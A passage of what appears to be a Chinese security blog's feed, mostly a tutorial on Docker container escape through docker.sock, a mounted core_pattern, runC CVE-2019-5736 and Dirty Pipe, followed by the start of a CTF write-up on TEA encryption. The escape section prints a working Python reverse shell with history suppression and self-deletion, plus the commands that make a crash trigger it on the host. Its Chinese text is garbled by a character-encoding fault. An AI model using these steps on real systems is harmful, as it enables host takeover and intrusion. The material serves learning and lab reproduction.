class="comment"># å·²ç»çœ‹åˆ°å®¿ä¸»æœºçš„docker</span></span><br></pre></td></tr></table></figure><ul><li>â€‹åœ¨è¯¥ docker ä¸­è¿è¡Œä¸€ä¸ª docker å¦‚ä¸Šé¢çš„ ubuntu ç„¶åæŠŠå®¿ä¸»æœºæ ¹ç›®å½•æŒ‚è½½è¿›æ¥ã€‚</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@33bbc53772f2:/# docker -H unix://var/run/docker.sock run -v /docker-test:/test -it ubuntu /bin/bash</span><br><span class="line">root@5138e163ac71:/#    //å¯ä»¥çœ‹åˆ°å·²ç»æ¢å®¹å™¨äº†ã€‚</span><br></pre></td></tr></table></figure><ul><li>â€‹å‰©ä¸‹æ“ä½œä¸ç¬¬ä¸€ä¸ªåŸºäºç‰¹æƒçš„ä¸€æ ·ï¼Œå†™è®¡åˆ’ä»»åŠ¡</li></ul><h4 id="æŒ‚è½½å®¿ä¸»æœº-procfs-çš„æƒ…å†µ"><a href="#æŒ‚è½½å®¿ä¸»æœº-procfs-çš„æƒ…å†µ" class="headerlink" title="æŒ‚è½½å®¿ä¸»æœº procfs çš„æƒ…å†µ"></a><strong>æŒ‚è½½å®¿ä¸»æœº procfs çš„æƒ…å†µ</strong></h4><p>procfsæ˜¯ä¸€ä¸ªä¼ªæ–‡ä»¶ç³»ç»Ÿï¼Œå®ƒåŠ¨æ€åæ˜ ç€ç³»ç»Ÿå†…è¿›ç¨‹åŠå…¶ä»–ç»„ä»¶çš„çŠ¶æ€ï¼Œå…¶ä¸­æœ‰è®¸å¤šååˆ†æ•æ„Ÿé‡è¦çš„æ–‡ä»¶ã€‚å› æ­¤ï¼Œå°†å®¿ä¸»æœºçš„procfsæŒ‚è½½åˆ°ä¸å—æ§çš„å®¹å™¨ä¸­ä¹Ÿæ˜¯ååˆ†å±é™©çš„ï¼Œå°¤å…¶æ˜¯åœ¨è¯¥å®¹å™¨å†…é»˜è®¤å¯ç”¨rootæƒé™ï¼Œä¸”æ²¡æœ‰å¼€å¯User Namespaceæ—¶ã€‚</p><ul><li>æ–‡ä»¶<code>/proc/sys/kernel/core_pattern</code>å®ƒåœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¦‚æœè¿›ç¨‹å´©æºƒäº†ï¼Œç³»ç»Ÿå†…æ ¸ä¼šæ•è·åˆ°è¿›ç¨‹å´©æºƒä¿¡æ¯ï¼Œå°†è¿›ç¨‹å´©æºƒä¿¡æ¯ä¼ é€’ç»™è¿™ä¸ªæ–‡ä»¶ä¸­çš„ç¨‹åºæˆ–è€…è„šæœ¬ã€‚</li><li>ä» 2.6.19 å†…æ ¸ç‰ˆæœ¬å¼€å§‹ï¼ŒLinux æ”¯æŒåœ¨ <code>/proc/sys/kernel/core_pattern</code> ä¸­ä½¿ç”¨æ–°è¯­æ³•ã€‚å¦‚æœè¯¥æ–‡ä»¶ä¸­çš„é¦–ä¸ªå­—ç¬¦æ˜¯ç®¡é“ç¬¦â€™|â€™ï¼Œé‚£ä¹ˆè¯¥è¡Œçš„å‰©ä½™å†…å®¹å°†è¢«å½“ä½œç”¨æˆ·ç©ºé—´ç¨‹åºæˆ–è„šæœ¬è§£é‡Šå¹¶æ‰§è¡Œã€‚</li></ul><h5 id="docker-å®¹å™¨å¤ç°-4"><a href="#docker-å®¹å™¨å¤ç°-4" class="headerlink" title="docker å®¹å™¨å¤ç°"></a>docker å®¹å™¨å¤ç°</h5><ul><li><p>ç¯å¢ƒæ­å»º</p><ul><li>åˆ›å»ºä¸€ä¸ªå®¹å™¨å¹¶æŒ‚è½½ <code>/proc</code> ç›®å½•ï¼š<code>docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu</code></li></ul></li><li><p>æ¼æ´éªŒè¯</p><ul><li><p>å¦‚æœèƒ½å† docker ä¸­æ‰¾åˆ°ä¸¤ä¸ª<code>core_pattern</code> æ–‡ä»¶ï¼š<code>find / -name core_pattern</code></p></li><li><p>æ‰§è¡Œä»¥ä¸‹å‘½ä»¤è¿”å›â€™mountesâ€™ï¼š<code>find / -name core_pattern 2&gt;/dev/null | wc -l | grep -q 2 &amp;&amp; echo &quot;mounted.&quot; || echo &quot;not mounted.&quot;</code></p></li></ul></li><li><p>æ¼æ´åˆ©ç”¨</p><ul><li>å½“å¯åŠ¨ä¸€ä¸ªå®¹å™¨æ—¶ï¼Œä¼šåœ¨<code>/var/lib/docker/overlay2</code>ç›®å½•ä¸‹ç”Ÿæˆä¸€å±‚å®¹å™¨å±‚ï¼Œå®¹å™¨å±‚é‡Œé¢åŒ…æ‹¬<code>diffã€linkã€lowerã€mergedã€work</code>ç›®å½•ï¼Œè€Œ<code>docker</code>å®¹å™¨çš„ç›®å½•ä¿å­˜åœ¨<code>merged</code>ç›®å½•ä¸­ï¼Œé€šè¿‡å‘½ä»¤æ‰¾åˆ°å½“å‰å®¹å™¨åœ¨å®¿ä¸»æœºä¸‹çš„ç»å¯¹è·¯å¾„ï¼Œ<code>workdir</code>ä»£è¡¨çš„æ˜¯<code>docker</code>å®¹å™¨åœ¨å®¿ä¸»æœºä¸­çš„ç»å¯¹è·¯å¾„</li></ul></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">å®¿ä¸»æœº</span></span><br><span class="line">root@VM-8-4-debian:/var/lib/docker# cd /var/lib/docker/overlay2</span><br><span class="line">root@VM-8-4-debian:/var/lib/docker/overlay2# ls</span><br><span class="line">760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c</span><br><span class="line">760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c-init</span><br><span class="line">96e2b79bdb96147754d96aa991dc3f350b9b30dbd52e566ac58026d24cebcc5f</span><br><span class="line">aba62047cc5b79a3ab92605b0d3aa8262d2ad6bbaf1d8706561092f4930cd3ba</span><br><span class="line">l</span><br><span class="line">root@VM-8-4-debian:/var/lib/docker/overlay2# cd 760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c</span><br><span class="line">root@VM-8-4-debian:/var/lib/docker/overlay2/760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c# ls</span><br><span class="line">diff  link  lower  merged  work</span><br><span class="line">root@VM-8-4-debian:/var/lib/docker/overlay2/760e81e5bdc90d8c5ab2e47e1ae4b3c98667a551d441e40d55581839c2139e0c# cd merged;ls</span><br><span class="line">bin   dev  home  lib    lib64   media  opt   root  sbin  sys  usr</span><br><span class="line">boot  etc  host  lib32  libx32  mnt    proc  run   srv   tmp  var</span><br></pre></td></tr></table></figure><ul><li><p>åœ¨å®¹å™¨ä¸­æŸ¥çœ‹è¯¥ç»å¯¹è·¯å¾„å¹¶å®šä¹‰ä¸º <code>host_dir</code> : <code>host_path=$(sed -n &#39;s/.*\\perdir=\\([^,]*\\).*/\\1/p&#39; /etc/mtab)</code></p><ul><li><p>å†™é©¬ï¼š<code>echo -e &quot;|$host_dir/tmp/.t.py \\rcore&quot; &gt; /host/sys/kernel/core_pattern</code></p></li><li><p>æ¥ä¸‹æ¥åœ¨å®¹å™¨é‡Œï¼š<code>/tmp/.x.py</code> ä¸­å†™é©¬</p><p>ç¤ºä¾‹ï¼š</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">lhost = <span class="string">&quot;xxx&quot;</span></span><br><span class="line">lport = xxx</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.connect((lhost, lport))</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">0</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">1</span>)</span><br><span class="line">    os.dup2(s.fileno(), <span class="number">2</span>)</span><br><span class="line">    os.putenv(<span class="string">&quot;HISTFILE&quot;</span>, <span class="string">&#x27;/dev/null&#x27;</span>)</span><br><span class="line">    pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br><span class="line">    os.remove(<span class="string">&#x27;/tmp/.x.py&#x27;</span>)</span><br><span class="line">    s.close()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>æœ€åï¼Œåœ¨å®¹å™¨å†…è¿è¡Œä¸€ä¸ªå¯ä»¥å´©æºƒçš„ç¨‹åºå³å¯ï¼Œä¾‹å¦‚ï¼šx.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> *a = <span class="literal">NULL</span>;</span><br><span class="line">    *a = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>è¿è¡Œï¼š<code>gcc t.c -o t &amp;&amp; ./t</code>  ï¼ˆå®¹å™¨éœ€è¦æå‰å®‰è£… gcc ç¯å¢ƒï¼‰</p></li></ul><h3 id="åŸºäºç¨‹åºæ¼æ´çš„é€ƒé€¸"><a href="#åŸºäºç¨‹åºæ¼æ´çš„é€ƒé€¸" class="headerlink" title="åŸºäºç¨‹åºæ¼æ´çš„é€ƒé€¸"></a>åŸºäºç¨‹åºæ¼æ´çš„é€ƒé€¸</h3><p>ç›¸å…³ç¨‹åºæ¼æ´ï¼ŒæŒ‡çš„æ˜¯é‚£äº›å‚ä¸åˆ°å®¹å™¨ç”Ÿæ€ä¸­çš„æœåŠ¡ç«¯ã€å®¢æˆ·ç«¯ç¨‹åºè‡ªèº«å­˜åœ¨çš„æ¼æ´ã€‚æœ‰å…³ç¨‹åºç»„ä»¶ï¼Œè§ä¸‹å›¾ï¼š</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240302144614060.png" alt="image-20240302144614060" style="zoom:33%;" /><h4 id="Docker-runCé€ƒé€¸-CVE-2019-5736"><a href="#Docker-runCé€ƒé€¸-CVE-2019-5736" class="headerlink" title="Docker runCé€ƒé€¸-CVE-2019-5736"></a><strong>Docker runCé€ƒé€¸-CVE-2019-5736</strong></h4><p>æ¯”è¾ƒè¯¦ç»†çš„è§£è¯´è§ï¼š<a href="https://www.notion.so/83c38257edcd438dba59a141a354beda?pvs=21">å®¹å™¨é€ƒé€¸æˆçœŸï¼šä»CTFè§£é¢˜åˆ°CVE-2019-5736æ¼æ´æŒ–æ˜åˆ†æ</a></p><p>æ€»ç»“ï¼š</p><ul><li>æˆ‘ä»¬åœ¨æ‰§è¡ŒåŠŸèƒ½ç±»ä¼¼äº <code>docker exec</code> çš„å‘½ä»¤æ—¶ï¼Œåº•å±‚å®é™…ä¸Šæ˜¯å®¹å™¨è¿è¡Œæ—¶åœ¨æ“ä½œã€‚ä¾‹å¦‚ <code>runc</code></li><li>ç›¸åº”åœ°ï¼Œ<code>runc exec</code>å‘½ä»¤ä¼šè¢«æ‰§è¡Œã€‚å®ƒçš„æœ€ç»ˆæ•ˆæœæ˜¯åœ¨å®¹å™¨å†…éƒ¨æ‰§è¡Œç”¨æˆ·æŒ‡å®šçš„ç¨‹åºã€‚è¿›ä¸€æ­¥è®²ï¼Œå°±æ˜¯åœ¨å®¹å™¨çš„å„ç§å‘½åç©ºé—´å†…ï¼Œå—åˆ°å„ç§é™åˆ¶ï¼ˆå¦‚<code>cgroups</code>ï¼‰çš„æƒ…å†µä¸‹ï¼Œå¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ã€‚é™¤æ­¤ä»¥å¤–ï¼Œè¿™ä¸ªæ“ä½œä¸å®¿ä¸»æœºä¸Šæ‰§è¡Œä¸€ä¸ªç¨‹åºå¹¶æ— äºŒè‡´ã€‚</li><li>è¿™ä¸ªè¿‡ç¨‹ä¸­å­˜åœ¨çš„é£é™©åœ¨äºï¼š<code>/proc</code> ï¼šå¦‚æœå°è¯•æ‰“å¼€<code>/proc/[PID]/exe</code> ï¼Œåœ¨æƒé™æ£€æŸ¥é€šè¿‡çš„æƒ…å†µä¸‹ï¼Œå†…æ ¸å°†ç›´æ¥è¿”å›ä¸€ä¸ªæŒ‡å‘è¯¥æ–‡ä»¶çš„æè¿°ç¬¦ï¼ˆfile descriptorï¼‰ï¼Œè€ŒéæŒ‰ç…§ä¼ ç»Ÿçš„æ‰“å¼€æ–¹å¼å»åšè·¯å¾„è§£æå’Œæ–‡ä»¶æŸ¥æ‰¾ã€‚è¿™æ ·ä¸€æ¥ï¼Œå®ƒå®é™…ä¸Šç»•è¿‡äº† <code>mnt</code> å‘½åç©ºé—´åŠ <code>chroot</code> å¯¹ä¸€ä¸ªè¿›ç¨‹èƒ½å¤Ÿè®¿é—®åˆ°çš„æ–‡ä»¶è·¯å¾„çš„é™åˆ¶ã€‚</li><li>åœ¨ <code>runc exec</code> åŠ å…¥åˆ°å®¹å™¨çš„å‘½åç©ºé—´ä¹‹åï¼Œå®¹å™¨å†…è¿›ç¨‹å·²ç»èƒ½å¤Ÿé€šè¿‡å†…éƒ¨ <code>/proc</code> è§‚å¯Ÿåˆ°å®ƒï¼Œæ­¤æ—¶å¦‚æœæ‰“å¼€ <code>/proc/[runc-PID]/exe</code> å¹¶å†™å…¥ä¸€äº›å†…å®¹ï¼Œå°±èƒ½å¤Ÿå®ç°å°†å®¿ä¸»æœºä¸Šçš„ <code>runc</code> äºŒè¿›åˆ¶ç¨‹åºè¦†ç›–æ‰ï¼è¿™æ ·ä¸€æ¥ï¼Œä¸‹ä¸€æ¬¡ç”¨æˆ·è°ƒç”¨ <code>runc</code> å»æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œå®é™…æ‰§è¡Œçš„å°†æ˜¯æ”»å‡»è€…æ”¾ç½®çš„æŒ‡ä»¤ã€‚</li></ul><p>åœ¨æœªå‡çº§çš„å®¹å™¨ç¯å¢ƒä¸Šï¼Œä¸Šè¿°æ€è·¯æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯æ”»å‡»è€…æƒ³è¦åœ¨å®¹å™¨å†…å®ç°å®¿ä¸»æœºä¸Šçš„ä»£ç æ‰§è¡Œï¼ˆé€ƒé€¸ï¼‰ï¼Œè¿˜éœ€è¦é¢å¯¹ä¸¤ä¸ªé™åˆ¶ï¼š</p><ol><li>éœ€è¦å…·æœ‰å®¹å™¨å†…éƒ¨ root æƒé™ï¼›</li><li>Linux ä¸å…è®¸ä¿®æ”¹æ­£åœ¨è¿è¡Œè¿›ç¨‹å¯¹åº”çš„æœ¬åœ°äºŒè¿›åˆ¶æ–‡ä»¶ã€‚</li></ol><p>äº‹å®ä¸Šï¼Œé™åˆ¶1ç»å¸¸ä¸å­˜åœ¨ï¼Œå¾ˆå¤šå®¹å™¨æœåŠ¡å¼€æ”¾ç»™ç”¨æˆ·çš„ä»ç„¶æ˜¯rootæƒé™ï¼›è€Œé™åˆ¶2æ˜¯å¯ä»¥å…‹æœçš„</p><blockquote><p> <strong>å½±å“ç‰ˆæœ¬</strong></p><p>docker version &lt;&#x3D; 18.09.2</p><p>RunC version &lt; 1.0-rc6</p></blockquote><p>å› ä¸ºä¸ªäººæœåŠ¡å™¨dockerç‰ˆæœ¬è¿‡é«˜ï¼Œä¸”EXPæˆç†Ÿï¼Œå°±ä¸å¤ç°äº†ã€‚æµç¨‹ï¼š</p><ul><li><p>ä½¿ç”¨EXPï¼š <a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p></li><li><p>ç¼–è¯‘POCï¼š<code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64  go build main.go</code></p></li><li><p>å¼€å¯ç›‘å¬ååœ¨å®¹å™¨ä¸­æ¨¡æ‹Ÿç”¨æˆ·è¿›å…¥dockeré•œåƒï¼š<code>docker exec -it container_id bash</code></p></li><li><p>æ­¤æ—¶ä¼šå‘ç°runCæ–‡ä»¶è¢«æ”¹å˜</p></li></ul><h3 id="åŸºäºå†…æ ¸æ¼æ´çš„é€ƒé€¸"><a href="#åŸºäºå†…æ ¸æ¼æ´çš„é€ƒé€¸" class="headerlink" title="åŸºäºå†…æ ¸æ¼æ´çš„é€ƒé€¸"></a>åŸºäºå†…æ ¸æ¼æ´çš„é€ƒé€¸</h3><h4 id="è„ç®¡é“-CVE-2022-0847-Dirty-Pipe"><a href="#è„ç®¡é“-CVE-2022-0847-Dirty-Pipe" class="headerlink" title="è„ç®¡é“(CVE-2022-0847) Dirty Pipe"></a>è„ç®¡é“(CVE-2022-0847) Dirty Pipe</h4><p>è¯¥æ¼æ´çš„å¤§æ¦‚åŸç†ä¸º<code>splice</code>ç³»ç»Ÿè°ƒç”¨ç”±äºæœªåˆå§‹åŒ–æŸbufï¼Œå¯èƒ½åŒ…å«æ—§çš„<code>PIPE_BUF_FLAG_CAN_MERGE</code>ï¼Œå¯¼è‡´å¯ä»¥é€šè¿‡ç®¡é“è¶Šç•Œå†™ï¼Œè¦†ç›–å…³é”®æ–‡ä»¶å¦‚<code>/etc/passwd</code>å¯è¾¾åˆ°ææƒçš„æ•ˆæœã€‚å› æ¼æ´ç±»å‹å’Œâ€œDirtyCowâ€ï¼ˆè„ç‰›ï¼‰ç±»ä¼¼ï¼Œå‘ç°è€… Max Kellermann ç ”ç©¶å‘˜å°†è¯¥æ¼æ´å‘½åä¸º Dirty Pipe</p><p>å‚è€ƒé“¾æ¥</p><ul><li><a href="https://fa1lr4in.com/2022/03/30/CVE-2022-0847-dirtypipe-linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E5%85%A8%E7%BD%91%E7%AC%AC%E4%BA%8C%E8%AF%A6%E7%BB%86%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2022-0847 dirtypipe linuxæœ¬åœ°ææƒå…¨ç½‘ç¬¬äºŒè¯¦ç»†æ¼æ´åˆ†æ</a></li></ul><p>æ€»ç»“ä¸€äº›å‰ç½®çŸ¥è¯†ç‚¹</p><ul><li>ç®¡é“ä¸é‡å®šå‘çš„ç®€å•åŒºåˆ«åœ¨äºï¼Œé‡å®šå‘å°†å‘½ä»¤ä¸æ–‡ä»¶è¿æ¥èµ·æ¥ï¼Œè€Œç®¡é“ç¬¦å°†å‘½ä»¤ä¸å‘½ä»¤è¿æ¥èµ·æ¥ã€‚</li><li><code>pipe_write</code>å‡½æ•°å¯¹<code>PIPE_BUF_FLAG_CAN_MERGE</code>çš„æ“ä½œï¼Œæœ¬æ¥æ— å…³ç—›ç—’ï¼Œåªæ˜¯å¯ä»¥éšæ„è¦†å†™ç®¡é“ã€‚ä½†æ˜¯ç”±äº <code>page cache</code> çš„å­˜åœ¨ï¼Œä»¤æˆ‘ä»¬éšæ„è¦†å†™ç®¡é“è½¬æ¢æˆéšæ„è¦†å†™æ–‡ä»¶ï¼Œåé¢æƒ³åˆ°å¯ä»¥è¦†å†™ <code>/etc/passwd</code> ï¼Œæœ€ç»ˆè¾¾åˆ°ææƒçš„ç›®çš„</li></ul><p>æ¼æ´å¤ç°</p><ul><li>åœ¨è™šæ‹Ÿæœºï¼ˆcentos 7ï¼Œ 3.10.0-1160 kernalï¼‰ä¸­ä½¿ç”¨ <code>psych</code> ç”¨æˆ·è¿›è¡Œæµ‹è¯•</li><li>ä½¿ç”¨ github ä¸Š pocï¼Œè¿è¡Œåç›´æ¥ææƒä¸º root<ul><li>è´´ä¸äº†å›¾äº†ï¼Œcentos 7 ç²¾ç®€ç‰ˆéš¾ç”¨çš„æˆ‘æƒ³æ€äºº</li></ul></li></ul><p>pocç†è§£</p><ul><li>åˆ›å»ºpipe</li><li>ä½¿ç”¨ä»»æ„æ•°æ®å¡«å……ç®¡é“(å¡«æ»¡, è€Œä¸”æ˜¯å¡«æ»¡Pipeçš„æœ€å¤§ç©ºé—´)</li><li>æ¸…ç©ºç®¡é“å†…æ•°æ®</li><li>ä½¿ç”¨splice()è¯»å–ç›®æ ‡æ–‡ä»¶(åªè¯»)çš„1å­—èŠ‚æ•°æ®å‘é€è‡³pipe</li><li>write()å°†ä»»æ„æ•°æ®ç»§ç»­å†™å…¥pipe, æ­¤æ•°æ®å°†ä¼šè¦†ç›–ç›®æ ‡æ–‡ä»¶å†…å®¹</li></ul><p>åªè¦æŒ‘é€‰åˆé€‚çš„ç›®æ ‡æ–‡ä»¶(å¿…é¡»è¦æœ‰å¯è¯»æƒé™), åˆ©ç”¨æ¼æ´Patchæ‰å…³é”®å­—æ®µæ•°æ®, å³å¯å®Œæˆä»æ™®é€šç”¨æˆ·åˆ°rootç”¨æˆ·çš„æƒé™æå‡, POCä½¿ç”¨çš„æ˜¯&#x2F;etc&#x2F;passwdæ–‡ä»¶çš„åˆ©ç”¨æ–¹å¼ã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æ¶‰åŠå†…æ ¸æ¼æ´çš„ææƒæ–¹å¼å‡ ä¹éƒ½ç†è§£ä¸äº†ï¼Œå¤ªç¡¬æ ¸äº†ï¼Œç”¨ç”¨ poc å¾—äº†ã€‚</p><p>å…¶ä½™é€ƒé€¸å¾ˆå¤§ç¨‹åº¦éƒ½æ˜¯é€šè¿‡æŒ‚è½½è¿›è¡Œé€ƒé€¸ã€‚è¦ä¹ˆæœ¬å®¹å™¨æŒ‚è½½ï¼Œè¦ä¹ˆæœ¬å®¹å™¨é‡Œå†åˆ›å»ºä¸€ä¸ªå®¹å™¨æŒ‚è½½ã€‚æ€è·¯å·®ä¸å¤šï¼Œä¸»è¦å›´ç»• capabilities å’Œ mount åˆ©ç”¨ï¼Œæ€»çš„æ¥è¯´æ„Ÿè§‰éƒ½æ˜¯å±äºææƒæ“ä½œå§ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> äº‘åŸç”Ÿ </category>
          
          <category> å®¹å™¨å®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> äº‘å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNSS_2023_Recruit_Reverse_EASY_WriteUp</title>
      <link href="/2024/02/28/CNSS-2023-Recruit-Reverse-EASY-WriteUp/"/>
      <url>/2024/02/28/CNSS-2023-Recruit-Reverse-EASY-WriteUp/</url>
      
        <content type="html"><![CDATA[<h3 id="ğŸµ-EASY-èŒ¶æ¯å¤´å¤§å†’é™©"><a href="#ğŸµ-EASY-èŒ¶æ¯å¤´å¤§å†’é™©" class="headerlink" title="ğŸµ[EASY]èŒ¶æ¯å¤´å¤§å†’é™©"></a>ğŸµ[EASY]èŒ¶æ¯å¤´å¤§å†’é™©</h3><h4 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h4><p>åŠ è§£å¯†ï¼š</p><ul><li>ä½è¿ç®—å’Œå¼‚æˆ–æ“ä½œ</li><li>è¿­ä»£åŠ å¯†</li></ul><p>è¯´çš„æ˜¯ç®€å•çš„TeaåŠ å¯†ã€‚ã€‚è¿™ä¸ªåå­—æˆ‘è¿˜ä»¥ä¸ºæ˜¯ã€‚ã€‚ã€‚</p><h5 id="Tea"><a href="#Tea" class="headerlink" title="Tea"></a>Tea</h5><p><strong>â€œTEAâ€</strong> çš„å…¨ç§°ä¸º**â€Tiny Encryption Algorithmâ€**  æ˜¯1994å¹´ç”±è‹±å›½å‰‘æ¡¥å¤§å­¦çš„David j.wheelerå‘æ˜çš„.ã€‚å°±æ˜¯å¾®å‹åŠ å¯†ç®—æ³•ã€‚</p><p>TAGï¼šåˆ†ç»„åŠ å¯†ï¼›64ä½æ˜æ–‡åˆ†ç»„å’Œ128ä½å¯†é’¥ï¼›å­˜åœ¨ç¼ºé™·ï¼Œè®¾è®¡è€…æå‡ºXTEAï¼Œç»„ç»‡å¯†é’¥è¡¨æ”»å‡»ï¼Œé€Ÿåº¦æ›´æ…¢ï¼›</p><p>åŠ å¯†å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Encrypt</span><span class="params">(<span class="type">long</span>* EntryData, <span class="type">long</span>* Key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//åˆ†åˆ«åŠ å¯†æ•°ç»„ä¸­çš„å‰å››ä¸ªå­—èŠ‚ä¸å4ä¸ªå­—èŠ‚,4ä¸ªå­—èŠ‚ä¸ºä¸€ç»„æ¯æ¬¡åŠ å¯†ä¸¤ç»„</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="comment">//æ€»å…±åŠ å¯†32è½®</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += delta;</span><br><span class="line">        x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        y += ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æœ€ååŠ å¯†çš„ç»“æœé‡æ–°å†™å…¥åˆ°æ•°ç»„ä¸­</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£å¯†æ€è·¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">x +=xxx</span><br><span class="line"> </span><br><span class="line">y+=xxx è¿™ä¸¤ä¸ªå…¬å¼æ€»å…±æ˜¯æ‰§è¡Œäº†<span class="number">32</span>è½®,å¯ä»¥è®°åšä¸º</span><br><span class="line"> </span><br><span class="line">(x+=xxx)<span class="number">32</span></span><br><span class="line"> </span><br><span class="line">(y+=xxx)<span class="number">32</span></span><br><span class="line">é‚£ä¹ˆè§£å¯†çš„æ—¶å€™è‚¯å®šä¹Ÿæ˜¯æ‰§è¡Œ<span class="number">32</span>è½®,æ¯æ¬¡é€’å‡,ä¸”é¡ºåºå˜æ¢è¿‡æ¥</span><br><span class="line">(y-=xxx)</span><br><span class="line">(x-=xxx)</span><br><span class="line">å…¶ä¸­è¿™é‡Œçš„xxxå°±æ˜¯å¼‚æˆ–çš„å…¬å¼,æ ¹æ®å…¶ç‰¹æ€§æˆ‘ä»¬ä¸éœ€è¦æ”¹å…¬å¼ä¸­çš„å†…å®¹.æˆ‘ä»¬å¯ä»¥çœ‹åšæ˜¯ a ^ b ^ c åè¿‡æ¥</span><br><span class="line">c ^ b ^ a æ˜¯ä¸€æ ·çš„.</span><br><span class="line">æ—¢ç„¶å€’è¿‡æ¥äº†.æˆ‘ä»¬çš„å˜é‡(é»„é‡‘åˆ†å‰²)<span 